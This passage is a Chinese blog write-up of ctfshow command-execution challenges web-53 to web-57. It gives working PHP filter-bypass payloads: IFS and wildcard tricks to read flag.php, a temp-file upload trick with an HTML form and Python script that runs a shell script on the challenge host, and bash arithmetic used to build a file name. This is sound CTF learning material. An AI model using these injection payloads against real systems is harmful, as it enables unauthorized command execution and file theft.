+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1:c&#x27;&#x27;at$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br><span class="line">payload2:c=nl$IFS\fla\g.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-54"><a href="#web-54" class="headerlink" title="web-54"></a>web-54</h3><p>这道题加强了正则表达式</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404252023965.png" alt="image-20240425202337926" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如.*c.*a.*t.*</span><br><span class="line">就是匹配所有包含cat的字符串（不区分顺序）</span><br></pre></td></tr></table></figure>
+
+<p>用模糊匹配绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=/bin/c??$&#123;IFS&#125;????????</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-55"><a href="#web-55" class="headerlink" title="web-55"></a>web-55</h3><p><strong>payload1</strong></p>
+<p>利用bin目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</span><br><span class="line">这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>使用base64对flag.php进行加密同时使用?绕过字母限制</p>
+<p><strong>payload2</strong></p>
+<p>利用&#x2F;user&#x2F;bin目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、newaliases、nslookup passwd、quota、smb*、wget等。</span><br><span class="line">我们可以利用/usr/bin下的bzip2 意思就是说我们先将flag.php文件进行压缩，然后再将其下载</span><br></pre></td></tr></table></figure>
+
+<p>先c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????.???</p>
+<p>然后在url+ flag。php。bz2下载文件</p>
+<p><strong>payload3</strong></p>
+<p>无字母数字shell</p>
+<p>无字母数字webshell之提高篇</p>
+<p>shell下可以利用.来执行任意脚本</p>
+<p>可以通过发送一个上传文件的POST包，只要是php接收到上传的POST请求(请求结束后会删除临时文件)，就</p>
+<p>会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的</p>
+<p>大小写字母以及数字</p>
+<p>写一个post上传表单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://99da1d95-7eb6-468a-b044-cf1b1b5b393d.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;!--目标网址--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>构造POC<br><strong>注：shell程序必须以”#!&#x2F;bin&#x2F;sh”开始，#! &#x2F;bin&#x2F;sh 是指此脚本使用&#x2F;bin&#x2F;sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/62340463ed224d4a9b05d03d80da2c72.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5LiAYXVl,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=./???/????????[@-[]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/28f9e75bfe0947e882d8e719947447b0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5LiAYXVl,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p>payload 4</p>
+<p>运行下面脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &quot;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;feng.txt&#x27;, b&#x27;cat flag.php&#x27;)&#125;)</span><br><span class="line">    if r.text.find(&quot;flag&quot;) &gt; 0:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h3><p>因为过滤掉了数字，所以web55前两个方法都不行了。</p>
+<p>还是用上传文件的方法</p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p> 利用linux的$​(())构造出36</p>
+<p>$(())&#x3D;0</p>
+<p>$((~ $(()) ))&#x3D;-1</p>
+<p>(())是用来整数运算的命令，内部可以放表达式，默认相加，通过$((~36)) 可得36取反为-37</p>
+<p> 36可以通过外层为$(())包裹内层可以运算出36的表达式构造，36由-37取反得到，所以</p>
+<p>$((<del>$((   ))))   内部加上37个$((</del> $(()) )) 得到 -37 。</p>
+<p>再捋一遍就是：<br>题目要读取36.php，先对36取反，可以知道36可以由-37取反得到，-37又可以拆成37个 -1 相加也就是37个$((~$(( ))))，再在外面取反(也就是对-37取反)就可以得到36</p>
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) ))))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><blockquote>
+<p>1、双小括号：（（））</p>
+<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
+<p>还要知道$(())的值是0</p>
+<p>2、取反：</p>
+<p>如果b&#x3D;~a，那么a+b&#x3D;-1。可以用二进制验算 </p>
+<p><img src="https://img-blog.csdnimg.cn/20210831092105318.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img" loading="lazy"></p>
+<p>3、echo ${_} #返回上一次的执行结果</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20210831092201573.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVFQxM1VH,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img" loading="lazy"></p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">我很可爱，请给我钱</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045089.png"><img loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045089.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045492.png"><img loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045492.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045283.png"><img loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045283.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinsey973.github.io/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow 命令执行">https://kinsey973.github.io/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="命令执行"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">命令执行</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/08/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="next" title="ctfshow 信息搜集"><span class="post-nav-text">ctfshow 信息搜集</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/kinsey973/kinsey973.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备17038157号</a></div><div class="copyright"><span>&copy; 2023 – 2024 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinsey973" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="开往-友链接力"><img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script></body></html>
